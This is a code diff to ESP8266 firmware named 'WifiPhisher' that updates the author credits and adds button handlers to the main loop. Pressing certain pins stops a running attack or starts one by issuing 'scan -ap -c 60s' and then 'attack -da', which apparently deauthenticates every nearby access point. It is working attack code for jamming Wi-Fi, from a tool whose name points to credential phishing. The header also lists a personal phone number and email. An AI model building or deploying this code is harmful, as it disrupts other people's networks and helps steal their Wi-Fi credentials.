@@ -1,7 +1,9 @@
 /*ESP8266 WifiPhisher
- * Facebook.com/vuongk03
+ * Facebook.com/244v234
+ * https://github.com/244v234/ESP8266-WifiPhisher/
  * 0971.282.336
  * vanvuonghp234@gmail.com
+ * hackster.io/244v234
  */
 
 extern "C" {
@@ -177,5 +179,39 @@ void loop() {
     booted = true;
     digitalWrite(D4, HIGH);
   }
-// :)
+
+         if(digitalRead(12) == LOW && digitalRead(13) == LOW) {
+          if(attack.isRunning()){ 
+      WiFi.mode(WIFI_OFF);
+      digitalWrite(D4, HIGH);
+      alert.showSuccess(str(D_STOPATTACK_ALERT)); 
+      scan.stop();             
+      attack.stop();
+      }
+      else{
+      WiFi.mode(WIFI_OFF);
+      alert.showSuccess(str(D_ATTACKALL_ALERT));
+      digitalWrite(D4, LOW);
+      cli.runCommand("scan -ap -c 60s");           
+      cli.runCommand("attack -da");        
+        }
+    }
+
+  if(digitalRead(0)== LOW){
+          if(attack.isRunning()){ 
+      WiFi.mode(WIFI_OFF);
+      digitalWrite(D4, HIGH);
+      alert.showSuccess(str(D_STOPATTACK_ALERT)); 
+      scan.stop();             
+      attack.stop();
+      }
+      else{
+      WiFi.mode(WIFI_OFF);
+      alert.showSuccess(str(D_ATTACKALL_ALERT));
+      digitalWrite(D4, LOW);
+      cli.runCommand("scan -ap -c 60s");           
+      cli.runCommand("attack -da");        
+        }
+       }
+  
 }
